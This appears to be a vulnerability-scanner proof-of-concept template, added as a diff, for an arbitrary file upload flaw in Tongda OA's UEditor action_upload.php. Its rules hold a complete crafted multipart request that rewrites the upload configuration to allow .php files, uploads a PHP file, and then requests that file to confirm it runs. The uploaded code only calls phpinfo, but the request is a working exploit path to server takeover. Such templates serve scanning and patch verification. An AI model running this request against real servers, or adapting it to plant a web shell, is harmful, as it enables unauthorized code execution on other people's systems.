@@ -1,0 +1,26 @@
+name: tongda_OA_action_upload.php_file_upload_getshell
+transport: http
+detail:
+  dock: app="TongDa-OA"
+  product: TongDa-OA
+  homepage: http://www.tongda2000.com/
+  impact: ''
+  description: The Tongda OA action_upload.php file has a file upload vulnerability.
+    Attackers can use this vulnerability to gain server permissions.
+set:
+  randFileName: randomLowercase(4)
+rules:
+  r1:
+    method: POST
+    body: "-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\r\nff\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n1000000000\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\r\n{{randFileName}}\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n.php\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"ff\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php phpinfo();?>\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name=\"mufile\"\r\n\r\nsubmit\r\n-----------------------------55719851240137822763221368724--\r\n"
+    path: /module/ueditor/php/action_upload.php?action=uploadfile
+    headers:
+      X_Requested_With: XMLHttpRequest
+      Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
+    follow_redirects: false
+    expression: response.status == 200
+  r2: 
+    method: GET
+    url: "/{{randFileName}}.php"
+    expression: response.status == 200 && response.body.bcontains(b"phpinfo")
+expression: r1() && r2()
